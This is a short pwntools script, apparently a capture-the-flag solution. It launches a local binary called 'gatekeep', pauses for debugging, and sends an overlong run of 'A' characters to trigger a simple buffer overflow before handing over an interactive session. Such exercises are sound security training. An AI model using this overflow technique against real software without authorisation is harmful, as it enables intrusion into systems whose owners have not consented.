#!/usr/bin/env python3
from pwn import *
p = ELF('gatekeep', checksec=0).process(env={})


pause()
p.sendline(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
p.interactive()

